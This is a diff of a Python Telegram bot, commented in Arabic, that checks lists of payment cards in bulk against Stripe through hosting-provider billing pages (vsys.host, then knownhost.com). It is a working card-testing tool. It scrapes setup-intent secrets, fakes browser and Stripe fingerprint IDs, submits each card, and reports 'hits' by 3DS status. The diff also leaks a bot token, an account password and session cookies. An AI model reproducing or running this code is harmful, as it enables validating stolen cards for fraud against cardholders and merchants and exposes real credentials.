@@ -5,26 +5,28 @@ from datetime import datetime
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters
 import requests
+import random
+import string
+import time
 import re
-import urllib3
-from bs4 import BeautifulSoup
-
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 # ========== الإعدادات ==========
 BOT_TOKEN = "8334507568:AAHp9fsFTOigfWKGBnpiThKqrDast5y-4cU"
-ADMIN_IDS = [5895491379]
+ADMIN_IDS = [5895491379]  # ضع ID التليجرام بتاعك هنا
 
-INVOICE_ID = "260528"
-USERNAME = "renes98352@neuraxo.com"
-PASSWORD = "8AEBsC#3x5wZKs!"
-LOGIN_PAGE_URL = "https://vsys.host/index.php?rp=/login"
-
-cookies = {
-    '_gcl_au': '1.1.1086970495.1761294272',
-    'VsysFirstVisit': '1761307789',
-    'WHMCSqCgI4rzA0cru': 'm1ehetmctequ9op73ccg4mfbnv',
-    'WHMCSlogin_auth_tk': 'citwYWUwWFBwYTRzbG5xaUx2ZmNvRlJGOWtqcklzRkJxa09ab0RPVFhtTURiaXA2dER1ZEFrVU1xZG5Tc0pvRml3OXVUVjJUc0JRUjlzZm8rWmhSdmw3TUpSMGRFQXhKcU1UcmlXbEZQcFJPeUgxS3NYMll5R3Bwa0hIRXZXUFpqMVE3RGtsOTIzeXA5WW84TU1OR3N2b0JHbzEzUVBhd0pEUy80aDljSS80RkNJQys2YWczWEJSdERLa2txYnpHZkNZVVduUm8yZkRDdGFvV2ZCVXB3bVQ5TGd1UjJ2aC9tbEg5VkFrSjBBVkJiN20yME1Tc0p6bmhPY21KSy9LVFU4ZHU3cy9zczhIWFRoT2NlRndTa0EyOHpTVTluNVlQdUJPOWZrbWp0dmc5bUJkM2d1cm9pcy9TMGpOdmFqSUhlL1RSSlNiZ3FIRTBkODNvRUpsRUhSVzZkZ0pxWmIrQ08xZlU4aUFaeEkwWUx6VjRzWU13T3NMa3VkcnlJdHd6TjdlYVkvdXdWZ2x6Y0VOYXRJQlZqS0V4VkVCN0hNM2JIZ1RKOXVNPQ%3D%3D',
+# الـ Cookies الأصلية
+BASE_COOKIES = {
+    '_gcl_au': '1.1.1731755719.1761294273',
+    'PAPVisitorId': '7095f26325c875e9da4fdaa66171apP6',
+    '_fbp': 'fb.1.1761298965302.822697239648290722',
+    'lhc_per': 'vid|8994dfb5d60d3132fabe',
+    '__mmapiwsid': '0199d361-1f43-7b6b-9c97-250e8a6a95db:0664b174ef7b3925be07d4b964be6a38b1029da7',
+    '_gid': 'GA1.2.1609015390.1761435403',
+    'blesta_sid': 'agjvbn46370v0ilm5h72b8h0c7',
+    '_rdt_uuid': '1761294274156.8dd9903d-c9cf-401b-885d-0dad4931526f',
+    '_uetsid': 'a2028140b1fa11f086cd03ee33166b9d',
+    '_uetvid': 'df284260b0b211f086cb537b4a717cc2',
+    '_ga': 'GA1.2.586933227.1761298965',
 }
 
 # ========== إحصائيات ==========
@@ -32,263 +34,187 @@ stats = {
     'total': 0,
     'checking': 0,
     'approved': 0,
-    'live': 0,
-    'declined': 0,
+    'rejected': 0,
+    'secure_3d': 0,
+    'auth_attempted': 0,
     'errors': 0,
     'start_time': None,
     'is_running': False,
     'dashboard_message_id': None,
     'chat_id': None,
     'current_cards': [],
-    'session_renewals': 0,
-    'last_renewal': None,
     'error_details': {},
 }
 
-session_error_count = 0
-session_lock = threading.Lock()
+# ========== دالات مساعدة ==========
+def generate_random_string(length):
+    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
 
-# ========== دالات الفحص ==========
-def do_login():
-    global cookies
-    try:
-        print(f"🔄 محاولة تجديد الجلسة... ({datetime.now().strftime('%H:%M:%S')})")
-        sess = requests.Session()
-        sess.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})
-        
-        resp = sess.get(LOGIN_PAGE_URL, timeout=15, verify=False)
-        soup = BeautifulSoup(resp.text, "html.parser")
-        token_input = soup.find("input", {"name": "token"})
-        token = token_input["value"] if token_input else ""
-        
-        post_data = {"token": token, "username": USERNAME, "password": PASSWORD, "rememberme": "on"}
-        headers = {"Content-Type": "application/x-www-form-urlencoded", "Origin": "https://vsys.host", "Referer": LOGIN_PAGE_URL}
-        
-        login_resp = sess.post(LOGIN_PAGE_URL, data=post_data, headers=headers, timeout=15, verify=False)
-        
-        if "clientarea.php" in login_resp.url:
-            cookies.update(sess.cookies.get_dict())
-            stats['session_renewals'] += 1
-            stats['last_renewal'] = datetime.now()
-            print(f"✅ تم تجديد الجلسة بنجاح! (المرة #{stats['session_renewals']})")
-            return True
-        print("❌ فشل تجديد الجلسة - لم يتم التوجيه لـ clientarea")
-        return False
-    except Exception as e:
-        print(f"❌ خطأ في تجديد الجلسة: {str(e)}")
-        return False
+def generate_guid():
+    return f"{generate_random_string(8)}-{generate_random_string(4)}-{generate_random_string(4)}-{generate_random_string(4)}-{generate_random_string(12)}"
 
-def get_session_data():
+def create_fresh_session():
     session = requests.Session()
-    data = {'token': '771221946304082c891ac6c1542959d0e65da464', 'id': '31940'}
+    session.cookies.update(BASE_COOKIES)
+    
+    muid = f"{generate_guid()}{generate_random_string(6)}"
+    sid = f"{generate_guid()}{generate_random_string(6)}"
+    guid = f"{generate_guid()}{generate_random_string(6)}"
+    stripe_js_id = generate_guid()
+    
+    session.cookies.set('__stripe_mid', muid)
+    session.cookies.set('__stripe_sid', sid)
+    
+    return session, muid, sid, guid, stripe_js_id
+
+def get_payment_page(session):
+    headers = {
+        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
+        'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
+    }
+    
     try:
-        session.post(f'https://vsys.host/index.php?rp=/invoice/{INVOICE_ID}/pay', data=data, cookies=cookies, verify=False, timeout=10)
+        response = session.get('https://my.knownhost.com/client/accounts/add/cc/', headers=headers, timeout=30)
+        
+        csrf_token = None
+        csrf_match = re.search(r'_csrf_token"\s+value="([^"]+)"', response.text)
+        if csrf_match:
+            csrf_token = csrf_match.group(1)
+        
+        setup_secret = None
+        setup_match = re.search(r"'(seti_[A-Za-z0-9]+_secret_[A-Za-z0-9]+)'", response.text)
+        if setup_match:
+            setup_secret = setup_match.group(1)
+        
+        return csrf_token, setup_secret
+    except:
+        return None, None
+
+# ========== فحص البطاقة ==========
+async def check_card(card, bot_app):
+    parts = card.strip().split('|')
+    if len(parts) != 4:
+        stats['errors'] += 1
+        stats['error_details']['FORMAT_ERROR'] = stats['error_details'].get('FORMAT_ERROR', 0) + 1
+        stats['checking'] -= 1
+        await update_dashboard(bot_app)
+        await send_result(bot_app, card, "ERROR", "صيغة خاطئة")
+        return card, "ERROR", "صيغة خاطئة"
+    
+    card_number, exp_month, exp_year, cvv = parts
+    
+    session, muid, sid, guid, stripe_js_id = create_fresh_session()
+    csrf_token, setup_secret = get_payment_page(session)
+    
+    if not setup_secret:
+        stats['errors'] += 1
+        stats['error_details']['SETUP_ERROR'] = stats['error_details'].get('SETUP_ERROR', 0) + 1
+        stats['checking'] -= 1
+        await update_dashboard(bot_app)
+        await send_result(bot_app, card, "ERROR", "فشل Setup Secret")
+        session.close()
+        return card, "ERROR", "فشل Setup"
+    
+    headers = {
+        'accept': 'application/json',
+        'content-type': 'application/x-www-form-urlencoded',
+        'origin': 'https://js.stripe.com',
+        'referer': 'https://js.stripe.com/',
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
+    }
+    
+    data = {
+        'stripe_js_id': stripe_js_id,
+        'referrer_host': 'my.knownhost.com',
+        'key': 'pk_live_51JriIXI1CNyBUB8COjjDgdFObvaacy3If70sDD8ZSj0UOYDObpyQ4LaCGqZVzQiUqePAYMmUs6pf7BpAW8ZTeAJb00YcjZyWPn',
+        'request_surface': 'web_card_element_popup',
+    }
+    
+    try:
+        session.post('https://merchant-ui-api.stripe.com/elements/wallet-config', headers=headers, data=data, timeout=30)
     except:
         pass
     
-    resp = session.get(f'https://vsys.host/viewinvoice.php?id={INVOICE_ID}', cookies=cookies, verify=False, timeout=10)
-    m = re.search(r'https://checkout\.stripe\.com/[^\s\'"]+', resp.text)
-    if not m or '/pay/' not in m.group(0):
-        return None, None, None
+    time_on_page = random.randint(300000, 600000)
     
-    session_id = m.group(0).split('/pay/')[1].split('#')[0]
-    new_cookies = session.cookies.get_dict()
-    stripe_mid = new_cookies.get('__stripe_mid', cookies.get('__stripe_mid'))
-    stripe_sid = new_cookies.get('__stripe_sid', '')
+    confirm_data = f'payment_method_data[type]=card&payment_method_data[billing_details][name]=+&payment_method_data[billing_details][address][city]=&payment_method_data[billing_details][address][country]=US&payment_method_data[billing_details][address][line1]=&payment_method_data[billing_details][address][line2]=&payment_method_data[billing_details][address][postal_code]=&payment_method_data[billing_details][address][state]=AL&payment_method_data[card][number]={card_number}&payment_method_data[card][cvc]={cvv}&payment_method_data[card][exp_month]={exp_month}&payment_method_data[card][exp_year]={exp_year}&payment_method_data[guid]={guid}&payment_method_data[muid]={muid}&payment_method_data[sid]={sid}&payment_method_data[pasted_fields]=number&payment_method_data[payment_user_agent]=stripe.js%2F0366a8cf46%3B+stripe-js-v3%2F0366a8cf46%3B+card-element&payment_method_data[referrer]=https%3A%2F%2Fmy.knownhost.com&payment_method_data[time_on_page]={time_on_page}&payment_method_data[client_attribution_metadata][client_session_id]={stripe_js_id}&payment_method_data[client_attribution_metadata][merchant_integration_source]=elements&payment_method_data[client_attribution_metadata][merchant_integration_subtype]=card-element&payment_method_data[client_attribution_metadata][merchant_integration_version]=2017&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_51JriIXI1CNyBUB8COjjDgdFObvaacy3If70sDD8ZSj0UOYDObpyQ4LaCGqZVzQiUqePAYMmUs6pf7BpAW8ZTeAJb00YcjZyWPn&client_attribution_metadata[client_session_id]={stripe_js_id}&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&client_secret={setup_secret}'
     
-    return session_id, stripe_mid, stripe_sid
-
-async def check_card(card, bot_app):
-    global session_error_count
-    
-    parts = card.strip().split('|')
-    if len(parts) != 4:
-        error_type = "FORMAT_ERROR"
-        stats['errors'] += 1
-        stats['error_details'][error_type] = stats['error_details'].get(error_type, 0) + 1
-        stats['checking'] -= 1
-        await update_dashboard(bot_app)
-        print(f"❌ {card[:20]}... - صيغة خاطئة")
-        return card, error_type, "❌ صيغة خاطئة"
-    
-    cc, mm, yy, cvv = parts
-    
-    session_id, mid, sid = get_session_data()
-    if not session_id:
-        with session_lock:
-            session_error_count += 1
-            print(f"⚠️ خطأ Session #{session_error_count} - محاولة التجديد...")
-            if session_error_count >= 3:
-                if do_login():
-                    print("✅ تم تجديد الجلسة بنجاح")
-                    session_error_count = 0
-                else:
-                    print("❌ فشل تجديد الجلسة")
-        
-        error_type = "SESSION_ERROR"
-        stats['errors'] += 1
-        stats['error_details'][error_type] = stats['error_details'].get(error_type, 0) + 1
-        stats['checking'] -= 1
-        await update_dashboard(bot_app)
-        await send_result(bot_app, card, error_type, "فشل جلب Session")
-        print(f"❌ {cc[:6]}****{cc[-4:]} - فشل جلب Session")
-        return card, error_type, "فشل جلب Session"
-    
-    headers_api = {
-        'content-type': 'application/x-www-form-urlencoded',
-        'origin': 'https://checkout.stripe.com',
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-    }
-    
-    pm_data = (
-        f'type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mm}&card[exp_year]={yy}&'
-        'billing_details[name]=Mario+Rossi&billing_details[email]=mario.rossi%40gmail.com&'
-        'billing_details[address][line1]=Via+Roma+123&billing_details[address][city]=Milano&'
-        'billing_details[address][postal_code]=20121&'
-        f'billing_details[address][country]=IT&muid={mid}'
-    )
-    
-    if sid:
-        pm_data += f'&sid={sid}'
-    
-    pm_data += (
-        '&key=pk_live_51GkRAEGiP3Mqp3aOunbt41L2O6DAAHnCW6DdpPPMIHOdPcYKBewOAP8MgyYRitVPmsiv8QggjFDDsQ16Xtr4SBPW00hdKd4Xgd&'
-        f'client_attribution_metadata[checkout_session_id]={session_id}'
-    )
+    setup_intent_id = setup_secret.split('_secret_')[0]
     
     try:
-        r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers_api, data=pm_data, timeout=15)
-        pm_res = r1.json()
+        response = session.post(
+            f'https://api.stripe.com/v1/setup_intents/{setup_intent_id}/confirm',
+            headers=headers,
+            data=confirm_data,
+            timeout=30
+        )
         
-        if 'error' in pm_res:
-            error_msg = pm_res['error'].get('message', 'خطأ غير معروف')
-            error_code = pm_res['error'].get('code', 'unknown')
-            error_type = f"PM_{error_code}"
+        result = response.json()
+        
+        if 'next_action' in result:
+            source = result['next_action']['use_stripe_sdk']['three_d_secure_2_source']
             
-            stats['declined'] += 1
-            stats['error_details'][error_type] = stats['error_details'].get(error_type, 0) + 1
-            stats['checking'] -= 1
-            await update_dashboard(bot_app)
-            await send_result(bot_app, card, "DECLINED", error_msg)
-            print(f"❌ {cc[:6]}****{cc[-4:]} - {error_code}: {error_msg}")
-            return card, "DECLINED", error_msg
-        
-        if 'id' not in pm_res:
-            error_type = "PM_ERROR"
-            stats['errors'] += 1
-            stats['error_details'][error_type] = stats['error_details'].get(error_type, 0) + 1
-            stats['checking'] -= 1
-            await update_dashboard(bot_app)
-            await send_result(bot_app, card, error_type, "فشل إنشاء Payment Method")
-            print(f"⚠️ {cc[:6]}****{cc[-4:]} - فشل إنشاء Payment Method")
-            return card, error_type, "فشل إنشاء PM"
-        
-        pm_id = pm_res['id']
-        confirm_data = f'payment_method={pm_id}&expected_amount=6800'
-        if mid:
-            confirm_data += f'&muid={mid}'
-        if sid:
-            confirm_data += f'&sid={sid}'
-        confirm_data += f'&key=pk_live_51GkRAEGiP3Mqp3aOunbt41L2O6DAAHnCW6DdpPPMIHOdPcYKBewOAP8MgyYRitVPmsiv8QggjFDDsQ16Xtr4SBPW00hdKd4Xgd'
-        
-        r2 = requests.post(f'https://api.stripe.com/v1/payment_pages/{session_id}/confirm', headers=headers_api, data=confirm_data, timeout=15)
-        confirm_res = r2.json()
-        
-        if 'payment_intent' not in confirm_res:
-            error_type = "PI_ERROR"
-            error_msg = confirm_res.get('error', {}).get('message', 'لا يوجد Payment Intent')
+            auth_data = f'source={source}&browser=%7B%22fingerprintAttempted%22%3Afalse%2C%22fingerprintData%22%3Anull%2C%22challengeWindowSize%22%3Anull%2C%22threeDSCompInd%22%3A%22Y%22%2C%22browserJavaEnabled%22%3Afalse%2C%22browserJavascriptEnabled%22%3Atrue%2C%22browserLanguage%22%3A%22ar%22%2C%22browserColorDepth%22%3A%2224%22%2C%22browserScreenHeight%22%3A%22786%22%2C%22browserScreenWidth%22%3A%221397%22%2C%22browserTZ%22%3A%22-180%22%2C%22browserUserAgent%22%3A%22Mozilla%2F5.0+(Windows+NT+10.0%3B+Win64%3B+x64)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F141.0.0.0+Safari%2F537.36%22%7D&one_click_authn_device_support[hosted]=false&one_click_authn_device_support[same_origin_frame]=false&one_click_authn_device_support[spc_eligible]=true&one_click_authn_device_support[webauthn_eligible]=true&one_click_authn_device_support[publickey_credentials_get_allowed]=true&key=pk_live_51JriIXI1CNyBUB8COjjDgdFObvaacy3If70sDD8ZSj0UOYDObpyQ4LaCGqZVzQiUqePAYMmUs6pf7BpAW8ZTeAJb00YcjZyWPn'
             
+            auth_response = session.post('https://api.stripe.com/v1/3ds2/authenticate', headers=headers, data=auth_data, timeout=30)
+            auth_result = auth_response.json()
+            
+            trans_status = auth_result.get('ares', {}).get('transStatus', 'Unknown')
+            
+            if trans_status == 'N':
+                stats['approved'] += 1
+                stats['checking'] -= 1
+                await update_dashboard(bot_app)
+                await send_result(bot_app, card, "APPROVED", "Approved ✅")
+                session.close()
+                return card, "APPROVED", "Approved"
+            elif trans_status == 'R':
+                stats['rejected'] += 1
+                stats['checking'] -= 1
+                await update_dashboard(bot_app)
+                await send_result(bot_app, card, "REJECTED", "Card Declined")
+                session.close()
+                return card, "REJECTED", "Declined"
+            elif trans_status == 'C':
+                stats['secure_3d'] += 1
+                stats['checking'] -= 1
+                await update_dashboard(bot_app)
+                await send_result(bot_app, card, "3D_SECURE", "3D Secure Challenge")
+                session.close()
+                return card, "3D_SECURE", "3DS"
+            elif trans_status == 'A':
+                stats['auth_attempted'] += 1
+                stats['checking'] -= 1
+                await update_dashboard(bot_app)
+                await send_result(bot_app, card, "AUTH_ATTEMPTED", "Authentication Attempted")
+                session.close()
+                return card, "AUTH_ATTEMPTED", "Auth Attempted"
+            else:
+                stats['errors'] += 1
+                stats['error_details']['UNKNOWN_STATUS'] = stats['error_details'].get('UNKNOWN_STATUS', 0) + 1
+                stats['checking'] -= 1
+                await update_dashboard(bot_app)
+                await send_result(bot_app, card, "UNKNOWN", f"Status: {trans_status}")
+                session.close()
+                return card, "UNKNOWN", trans_status
+        else:
             stats['errors'] += 1
-            stats['error_details'][error_type] = stats['error_details'].get(error_type, 0) + 1
+            stats['error_details']['NO_3DS'] = stats['error_details'].get('NO_3DS', 0) + 1
             stats['checking'] -= 1
             await update_dashboard(bot_app)
-            await send_result(bot_app, card, error_type, error_msg)
-            print(f"⚠️ {cc[:6]}****{cc[-4:]} - {error_msg}")
-            return card, error_type, error_msg
-        
-        pi = confirm_res['payment_intent']
-        status = pi.get('status')
-        
-        if status == 'succeeded':
-            stats['approved'] += 1
-            stats['checking'] -= 1
-            await update_dashboard(bot_app)
-            await send_result(bot_app, card, "APPROVED", "Approved ✅")
-            print(f"✅ {cc[:6]}****{cc[-4:]} - Approved!")
-            return card, "APPROVED", "Approved"
-        
-        if status == 'requires_action':
-            na = pi.get('next_action', {})
-            if na.get('type') == 'use_stripe_sdk':
-                source_id = na.get('use_stripe_sdk', {}).get('three_d_secure_2_source')
-                if source_id:
-                    tds_data = (
-                        f'source={source_id}&'
-                        'browser=%7B%22threeDSCompInd%22%3A%22Y%22%2C%22browserJavaEnabled%22%3Afalse%2C%22browserJavascriptEnabled%22%3Atrue%2C%22browserLanguage%22%3A%22ar%22%2C%22browserColorDepth%22%3A%2224%22%2C%22browserScreenHeight%22%3A%22786%22%2C%22browserScreenWidth%22%3A%221397%22%2C%22browserTZ%22%3A%22-180%22%2C%22browserUserAgent%22%3A%22Mozilla%2F5.0+(Windows+NT+10.0%3B+Win64%3B+x64)+AppleWebKit%2F537.36%22%7D&'
-                        'key=pk_live_51GkRAEGiP3Mqp3aOunbt41L2O6DAAHnCW6DdpPPMIHOdPcYKBewOAP8MgyYRitVPmsiv8QggjFDDsQ16Xtr4SBPW00hdKd4Xgd'
-                    )
-                    
-                    r3 = requests.post('https://api.stripe.com/v1/3ds2/authenticate', headers=headers_api, data=tds_data, timeout=15)
-                    tds_res = r3.json()
-                    
-                    if 'error' in tds_res:
-                        error_msg = tds_res['error'].get('message', 'خطأ 3DS')
-                        error_type = "3DS_ERROR"
-                        
-                        stats['declined'] += 1
-                        stats['error_details'][error_type] = stats['error_details'].get(error_type, 0) + 1
-                        stats['checking'] -= 1
-                        await update_dashboard(bot_app)
-                        await send_result(bot_app, card, error_type, error_msg)
-                        print(f"❌ {cc[:6]}****{cc[-4:]} - 3DS Error: {error_msg}")
-                        return card, error_type, error_msg
-                    
-                    trans = tds_res.get('ares', {}).get('transStatus') or tds_res.get('transStatus')
-                    
-                    if trans == 'Y':
-                        stats['approved'] += 1
-                        stats['checking'] -= 1
-                        await update_dashboard(bot_app)
-                        await send_result(bot_app, card, "APPROVED", "Approved (3DS) ✅")
-                        print(f"✅ {cc[:6]}****{cc[-4:]} - Approved (3DS)!")
-                        return card, "APPROVED", "Approved (3DS)"
-                    elif trans == 'N':
-                        stats['live'] += 1
-                        stats['checking'] -= 1
-                        await update_dashboard(bot_app)
-                        await send_result(bot_app, card, "LIVE", "Live Card 🟢")
-                        print(f"🟢 {cc[:6]}****{cc[-4:]} - Live Card!")
-                        return card, "LIVE", "Live"
-                    else:
-                        stats['declined'] += 1
-                        stats['error_details']['3DS_FAILED'] = stats['error_details'].get('3DS_FAILED', 0) + 1
-                        stats['checking'] -= 1
-                        await update_dashboard(bot_app)
-                        await send_result(bot_app, card, "3DS_FAILED", f"3DS Status: {trans}")
-                        print(f"⚠️ {cc[:6]}****{cc[-4:]} - 3DS Status: {trans}")
-                        return card, "3DS_FAILED", f"3DS: {trans}"
-        
-        error = pi.get('last_payment_error', {})
-        error_msg = error.get('message', error.get('code', status)) if error else status
-        error_code = error.get('code', 'declined') if error else 'declined'
-        
-        stats['declined'] += 1
-        stats['error_details'][error_code] = stats['error_details'].get(error_code, 0) + 1
-        stats['checking'] -= 1
-        await update_dashboard(bot_app)
-        await send_result(bot_app, card, "DECLINED", error_msg)
-        print(f"❌ {cc[:6]}****{cc[-4:]} - {error_code}: {error_msg}")
-        return card, "DECLINED", error_msg
-        
+            await send_result(bot_app, card, "ERROR", "No 3DS Action")
+            session.close()
+            return card, "ERROR", "No 3DS"
+            
     except Exception as e:
-        error_type = "EXCEPTION"
         stats['errors'] += 1
-        stats['error_details'][error_type] = stats['error_details'].get(error_type, 0) + 1
+        stats['error_details']['EXCEPTION'] = stats['error_details'].get('EXCEPTION', 0) + 1
         stats['checking'] -= 1
         await update_dashboard(bot_app)
-        await send_result(bot_app, card, error_type, str(e))
-        print(f"💥 {cc[:6]}****{cc[-4:]} - Exception: {str(e)}")
-        return card, error_type, str(e)
+        await send_result(bot_app, card, "EXCEPTION", str(e)[:30])
+        session.close()
+        return card, "EXCEPTION", str(e)
 
 # ========== دالات البوت ==========
 async def send_result(bot_app, card, status_type, message):
@@ -298,15 +224,12 @@ async def send_result(bot_app, card, status_type, message):
     
     emoji_map = {
         'APPROVED': '✅',
-        'LIVE': '🟢',
-        'DECLINED': '❌',
-        'SESSION_ERROR': '🔴',
-        'PM_ERROR': '⚠️',
-        'PI_ERROR': '⚠️',
-        '3DS_ERROR': '🔶',
-        '3DS_FAILED': '🔶',
-        'FORMAT_ERROR': '❌',
-        'EXCEPTION': '⚠️'
+        'REJECTED': '❌',
+        '3D_SECURE': '⚠️',
+        'AUTH_ATTEMPTED': '🔄',
+        'ERROR': '⚠️',
+        'EXCEPTION': '💥',
+        'UNKNOWN': '❓'
     }
     
     emoji = emoji_map.get(status_type, '❓')
@@ -321,11 +244,11 @@ async def send_result(bot_app, card, status_type, message):
         [InlineKeyboardButton(f"⏰ {datetime.now().strftime('%H:%M:%S')}", callback_data="time_info")]
     ]
     
-    if status_type in ['APPROVED', 'LIVE']:
+    if status_type == 'APPROVED':
         try:
             await bot_app.bot.send_message(
                 chat_id=stats['chat_id'],
-                text=f"🎉 **HIT FOUND!**",
+                text=f"🎉 **APPROVED CARD FOUND!**",
                 reply_markup=InlineKeyboardMarkup(keyboard),
                 parse_mode='Markdown'
             )
@@ -348,22 +271,16 @@ def create_dashboard_keyboard():
         ],
         [
             InlineKeyboardButton(f"✅ Approved: {stats['approved']}", callback_data="approved"),
-            InlineKeyboardButton(f"🟢 Live: {stats['live']}", callback_data="live")
+            InlineKeyboardButton(f"❌ Rejected: {stats['rejected']}", callback_data="rejected")
         ],
         [
-            InlineKeyboardButton(f"❌ Declined: {stats['declined']}", callback_data="declined"),
+            InlineKeyboardButton(f"⚠️ 3D Secure: {stats['secure_3d']}", callback_data="3ds"),
+            InlineKeyboardButton(f"🔄 Auth Attempted: {stats['auth_attempted']}", callback_data="auth")
+        ],
+        [
             InlineKeyboardButton(f"⚠️ Errors: {stats['errors']}", callback_data="errors")
-        ],
-        [
-            InlineKeyboardButton(f"🔄 تجديدات الجلسة: {stats['session_renewals']}", callback_data="renewals")
         ]
     ]
-    
-    if stats['last_renewal']:
-        time_diff = (datetime.now() - stats['last_renewal']).seconds
-        keyboard.append([
-            InlineKeyboardButton(f"⏰ آخر تجديد: منذ {time_diff}ث", callback_data="last_renewal")
-        ])
     
     if stats['is_running']:
         keyboard.append([InlineKeyboardButton("🛑 إيقاف الفحص", callback_data="stop_check")])
@@ -388,7 +305,7 @@ async def update_dashboard(bot_app):
             await bot_app.bot.edit_message_text(
                 chat_id=stats['chat_id'],
                 message_id=stats['dashboard_message_id'],
-                text="📊 **STRIPE CARD CHECKER** 📊",
+                text="📊 **KNOWNHOST CARD CHECKER** 📊",
                 reply_markup=create_dashboard_keyboard(),
                 parse_mode='Markdown'
             )
@@ -402,7 +319,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     keyboard = [[InlineKeyboardButton("📁 إرسال ملف البطاقات", callback_data="send_file")]]
     await update.message.reply_text(
-        "📊 **STRIPE CARD CHECKER BOT**\n\n"
+        "📊 **KNOWNHOST CARD CHECKER BOT**\n\n"
         "أرسل ملف .txt يحتوي على البطاقات\n"
         "الصيغة: `رقم|شهر|سنة|cvv`",
         reply_markup=InlineKeyboardMarkup(keyboard),
@@ -424,19 +341,18 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
     stats['total'] = len(cards)
     stats['checking'] = 0
     stats['approved'] = 0
-    stats['live'] = 0
-    stats['declined'] = 0
+    stats['rejected'] = 0
+    stats['secure_3d'] = 0
+    stats['auth_attempted'] = 0
     stats['errors'] = 0
     stats['current_cards'] = []
-    stats['session_renewals'] = 0
-    stats['last_renewal'] = None
     stats['error_details'] = {}
     stats['start_time'] = datetime.now()
     stats['is_running'] = True
     stats['chat_id'] = update.effective_chat.id
     
     dashboard_msg = await update.message.reply_text(
-        "📊 **STRIPE CARD CHECKER** 📊",
+        "📊 **KNOWNHOST CARD CHECKER** 📊",
         reply_markup=create_dashboard_keyboard(),
         parse_mode='Markdown'
     )
@@ -464,7 +380,7 @@ async def process_cards(cards, bot_app):
         await asyncio.gather(*tasks)
         
         if i + 3 < len(cards):
-            await asyncio.sleep(3)
+            await asyncio.sleep(2)
     
     stats['is_running'] = False
     stats['checking'] = 0
@@ -474,10 +390,10 @@ async def process_cards(cards, bot_app):
     if stats['chat_id']:
         keyboard = [
             [InlineKeyboardButton(f"✅ Approved: {stats['approved']}", callback_data="final_approved")],
-            [InlineKeyboardButton(f"🟢 Live: {stats['live']}", callback_data="final_live")],
-            [InlineKeyboardButton(f"❌ Declined: {stats['declined']}", callback_data="final_declined")],
-            [InlineKeyboardButton(f"🔥 Total: {stats['total']}", callback_data="final_total")],
-            [InlineKeyboardButton(f"🔄 تجديدات: {stats['session_renewals']}", callback_data="final_renewals")]
+            [InlineKeyboardButton(f"❌ Rejected: {stats['rejected']}", callback_data="final_rejected")],
+            [InlineKeyboardButton(f"⚠️ 3D Secure: {stats['secure_3d']}", callback_data="final_3ds")],
+            [InlineKeyboardButton(f"🔄 Auth Attempted: {stats['auth_attempted']}", callback_data="final_auth")],
+            [InlineKeyboardButton(f"🔥 Total: {stats['total']}", callback_data="final_total")]
         ]
         await bot_app.bot.send_message(
             chat_id=stats['chat_id'],
